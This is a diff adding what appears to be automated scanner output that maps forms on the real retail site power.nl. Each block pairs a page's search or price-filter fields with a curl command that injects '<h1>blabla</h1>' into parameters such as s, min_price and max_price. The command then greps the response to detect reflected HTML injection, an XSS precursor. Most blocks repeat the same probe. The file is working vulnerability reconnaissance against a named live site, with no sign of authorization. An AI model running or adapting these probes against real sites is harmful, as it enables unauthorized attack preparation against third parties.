@@ -1,0 +1,131 @@
+
+
+
+https://www.power.nl?action=yith-woocompare-add-product&id=119201 2952
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl?action=yith-woocompare-add-product&id=119201 2952
+method:get
+https://www.power.nl/
+input     text      min_price                     50                  
+input     text      max_price                     9170                
+
+curl  "https://www.power.nl/?min_price=<h1>blabla</h1>&max_price=<h1>blabla</h1>" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/energie-vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/energiedeals/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/wishlist/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/energie-vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/energiedeals/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
+
+
+
+https://www.power.nl/vergelijken/
+method:get
+https://www.power.nl/
+input     text      s                                                 
+select              product_cat                                       
+input     hidden    post_type                     product             
+
+curl  "https://www.power.nl/?s=<h1>blabla</h1>&product_cat=1&post_type=product" 2> /dev/null 1| grep "<h1>blabla</h1>";echo $?
+
